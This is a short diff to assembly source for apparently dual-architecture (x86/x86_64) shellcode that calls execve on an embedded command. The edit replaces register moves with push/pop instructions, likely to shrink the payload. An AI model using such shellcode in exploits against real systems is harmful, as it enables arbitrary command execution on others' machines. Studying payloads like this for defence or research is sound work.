@@ -8,12 +8,13 @@ BITS	64
 continue:
 	pop	rdi
 	push	rdi
+	push	rsp
 	db	0x40 ; REX prefix ignored by x86_64, "dec eax" in x86
 	jnz	x86
 
 	; 64-bit exclusive code
 	mov	al, 59
-	mov	rsi, rsp
+	pop	rsi
 	syscall
 
 x86:
@@ -21,7 +22,7 @@ BITS	32
 	; 32-bit exclusive code
 	mov	al, 0xb
 	mov	ebx, edi
-	mov	ecx, esp
+	pop	ecx
 	int	0x80
 
 cmd:
